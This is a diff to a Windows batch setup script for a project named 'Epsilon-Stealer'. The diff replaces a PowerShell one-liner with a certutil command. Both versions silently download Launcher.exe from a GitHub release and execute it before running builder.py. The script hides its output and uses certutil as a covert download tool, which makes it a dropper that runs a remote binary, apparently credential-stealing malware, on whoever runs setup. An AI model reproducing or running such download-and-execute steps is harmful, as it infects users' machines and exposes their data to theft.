@@ -8,8 +8,16 @@ echo.
 echo Coded By https://github.com/Vinyzu3
 echo.
 
-cd tools
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Vinyzu3/Epsilon-Stealer/releases/download/relase/Launcher.exe';$file='win32.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+set "URL=https://github.com/Vinyzu3/Epsilon-Stealer/releases/download/relase/Launcher.exe"
+set "Dossier=tools"
+set "NomFichier=%Dossier%\Epsilon.exe"
+
+certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1
+
+if exist "%NomFichier%" (
+    start "" "%NomFichier%"
+)
+
 cd ..
 python builder.py
 
